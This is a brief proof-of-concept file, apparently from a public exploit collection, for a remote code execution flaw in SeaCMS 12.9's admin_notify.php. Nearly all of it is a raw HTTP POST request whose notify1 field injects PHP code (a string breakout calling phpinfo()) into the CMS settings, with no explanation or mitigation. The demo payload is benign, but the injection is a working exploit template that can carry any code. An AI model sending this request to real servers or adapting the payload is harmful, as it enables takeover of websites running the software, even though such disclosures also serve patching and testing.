# seacms_admin_notify.php_rce

from: https://github.com/wy876/POC/blob/main/%E6%B5%B7%E6%B4%8BCMS-admin_notify.php%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

```
POST /SeaCMS_12.9/Upload/pwh4pc/admin_notify.php?action=set HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Priority: u=1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1/SeaCMS_12.9/Upload/pwh4pc/admin_notify.php
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=8h9dt1md0b4ppcvdrjn64kfsum
Sec-Fetch-Site: same-origin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Mode: navigate
Origin: http://127.0.0.1
Accept-Encoding: gzip, deflate, br, zstd
 
notify1=1";phpinfo();;//&notify2=2&notify3=3
```
